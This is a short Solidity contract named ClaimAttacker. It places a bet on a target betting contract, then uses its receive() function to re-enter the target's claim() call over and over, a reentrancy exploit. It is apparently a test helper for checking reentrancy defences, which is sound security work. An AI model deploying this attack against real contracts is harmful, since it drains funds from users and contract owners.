// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
interface IPB { function bet(uint256, bool) external payable; function claim(uint256) external; }
contract ClaimAttacker {
    IPB pb; uint256 id;
    constructor(address _pb) { pb = IPB(_pb); }
    function bet(uint256 _id) external payable { pb.bet{value: msg.value}(_id, true); }
    function attack(uint256 _id) external { id = _id; pb.claim(_id); }
    receive() external payable { pb.claim(id); }
}
